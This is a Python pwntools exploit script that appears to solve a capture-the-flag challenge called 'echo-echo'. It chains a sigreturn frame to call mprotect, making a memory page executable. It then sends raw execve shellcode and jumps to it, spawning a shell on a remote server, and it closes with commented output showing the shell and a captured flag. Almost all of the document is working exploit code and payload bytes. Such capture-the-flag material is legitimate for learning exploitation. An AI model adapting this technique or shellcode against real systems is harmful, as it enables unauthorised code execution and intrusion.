#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('echo-echo')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        # return remote('3.97.113.25', 9002)
        return remote('147.182.172.200', 9002)
    else:
        return process([elf.path] + argv, *a, **kw)


gdbscript = '''
start
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
elf.address = 0x400000
io = start()
read_gadget = 0x0000000000400085
syscall_gadget = 0x000000000040009b 


payload = b'A'*0x8
payload += p64(read_gadget)
payload += p64(syscall_gadget)

frame = SigreturnFrame(arch='amd64')
frame.rax = 0xa                      # mprotect syscall
frame.rdi = 0x400000                 # addr for mprotect 
frame.rsi = 0x1000                   # we apply mprotect on one page
frame.rdx = 0x7                      # rwx permissions
frame.rsp = 0x400018                 # new stack top 
frame.rip = syscall_gadget           
payload += bytes(frame)

io.send(payload)

# input('> ')
payload = b'B'*7 
payload += b'\x00'
payload += p32(syscall_gadget)
payload += b'\x00'*3 # extra bytes, adjusting rax to be 0xf
io.send(payload) # now rax is 0xf(=SYS_sigreturn)


# part 2 - write shellcode on our rwx page & jump there
shellcode = b''
shellcode += b'\x31\xc0\x48\xbb\xd1\x9d\x96'
shellcode += b'\x91\xd0\x8c\x97\xff\x48\xf7'
shellcode += b'\xdb\x53\x54\x5f\x99\x52\x57'
shellcode += b'\x54\x5e\xb0\x3b\x0f\x05'

payload = b'A'*0x8
payload += p64(0x400020) # shellcode starts here
payload += b'\x90'*0x20
payload += shellcode 
# input('> ')
io.sendline(payload)

io.interactive()


# output : 
# [+] Opening connection to 147.182.172.200 on port 9002: Done
# [*] Switching to interactive mode
# $ id
# uid=1000(pwn2) gid=1000(pwn2) groups=1000(pwn2)
# $ ls
# echo-echo
# flag.txt
# start.sh
# $ cat flag.txt
# TamilCTF{S_r0pE_1s_A_SuC1De_R0pE}